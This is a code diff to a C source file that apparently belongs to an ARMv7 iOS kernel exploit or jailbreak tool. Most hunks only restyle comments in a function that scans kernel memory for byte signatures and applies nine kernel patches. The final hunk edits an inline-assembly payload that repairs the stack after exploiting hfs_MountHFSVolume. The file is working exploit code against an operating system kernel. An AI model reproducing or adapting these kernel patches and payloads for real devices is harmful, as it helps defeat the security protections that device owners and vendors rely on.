@@ -21,8 +21,7 @@ void* _memcpy(void* dest, const void* src, size_t n) {
 	return dest;
 }
 
-int _memcmp(const void *s1, const void *s2, size_t n)
-{
+int _memcmp(const void *s1, const void *s2, size_t n) {
 	int  v = 0;
 	unsigned char *p1 = (unsigned char *) s1;
 	unsigned char *p2 = (unsigned char *) s2;
@@ -115,9 +114,7 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 	*/
 	unsigned int i = 0;
 	for(i = 0; i < size; i++) {
-		/*
-		 * Patch 1
-		 */
+		// Patch 1
 		if(!_memcmp(&address[i], "\x00\x00\x00\x00\x01\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00", 16)) {
 			target = i + 0;
 			kprintf("Found kernel patch 1 at %p\n", &address[target]);
@@ -125,9 +122,7 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 			continue;
 		}
 
-		/*
-		 * Patch 2
-		 */
+		// Patch 2
 		if(!_memcmp(&address[i], "\x00\xB1\x00\x24\x20\x46\x90\xBD", 8)) {
 			target = i + 0;
 			kprintf("Found armv7 kernel patch 2 at %p\n", &address[target]);
@@ -141,9 +136,7 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 			continue;
 		}
 
-		/*
-		 * Patch 3
-		 */
+		// Patch 3
 		if(!_memcmp(&address[i], "\x00\x23\x00\x94\x01\x95\x02\x95", 8)) {
 			target = i + 10;
 			kprintf("Found kernel patch 3 at %p\n", &address[target]);
@@ -151,9 +144,7 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 			continue;
 		}
 
-		/*
-		 * Patch 4
-		 */
+		// Patch 4
 		if(!_memcmp(&address[i], "\x02\x90\x03\x90\x1D\x49\x50\x46", 8)) {
 			target = i + 12;
 			kprintf("Found armv7 kernel patch 4 at %p\n", &address[target]);
@@ -167,9 +158,7 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 			continue;
 		}
 
-		/*
-		 * Patch 5
-		 */
+		// Patch 5
 		if(!_memcmp(&address[i], "\xD3\x80\x04\x98\x02\x21\x7C\x4B", 8)
 				|| !memcmp(&address[i], "\x98\x47\x50\xB9\x00\x98\x02\x21", 8)) {
 			target = i + 8;
@@ -184,9 +173,7 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 			continue;
 		}
 
-		/*
-		 * Patch 6
-		 */
+		// Patch 6
 		if(!_memcmp(&address[i], "\x00\x28\x40\xF0\xCC\x80\x04\x98", 8)
 				|| !memcmp(&address[i], "\x28\xB9\x00\x98\xFF\xF7\x03\xFF", 8)) {
 			target = i + 8;
@@ -195,9 +182,7 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 			continue;
 		}
 
-		/*
-		 * Patch 7
-		 */
+		// Patch 7
 		if(!_memcmp(&address[i], "\x1F\x4C\x1E\xE0\x28\x46\x51\x46", 8)) {
 			target = i + 8;
 			kprintf("Found kernel patch 7 at %p\n", &address[target]);
@@ -205,9 +190,7 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 			continue;
 		}
 
-		/*
-		 * Patch 8
-		 */
+		// Patch 8
 		if(!_memcmp(&address[i], "\xA0\x47\x08\xB1\x28\x46\x30\xE0", 8)) {
 			target = i + 8;
 			kprintf("Found kernel patch 8 at %p\n", &address[target]);
@@ -215,9 +198,7 @@ int patch_kernel(unsigned char* address, unsigned int size) {
 			continue;
 		}
 
-		/*
-		 * Patch 9
-		 */
+		// Patch 9
 		if(!_memcmp(&address[i], "\x85\x68\x00\x23\x02\x93\x01\x93", 8) ||
 				!memcmp(&address[i], "\x85\x68\x00\x23\x04\x93\x03\x93", 8)) {
 			target = i + 8;
@@ -245,12 +226,16 @@ void payload() {
 		"add     sp, sp, #0x8\n\t"
 
 		// hfs_MountHFSVolume epilog:
-        	"add     sp, sp, #0xE4\n\t"
+		"mov	r0, #0x10\n\t"
+		"lsl	r0, #0x8\n\t"	// put a readable page address in r0
+
+		"add     sp, sp, #0xE4\n\t"
         	"pop     {r2-r4}\n\t"
         	"mov     r8, r2\n\t"
         	"mov     r10, r3\n\t"
 		"mov     r11, r4\n\t"
 		"pop     {r4-r7,pc}"
+		//"pop     {r4-r7}\n\t"
 	);
 
 	// pop	{r7, pc}
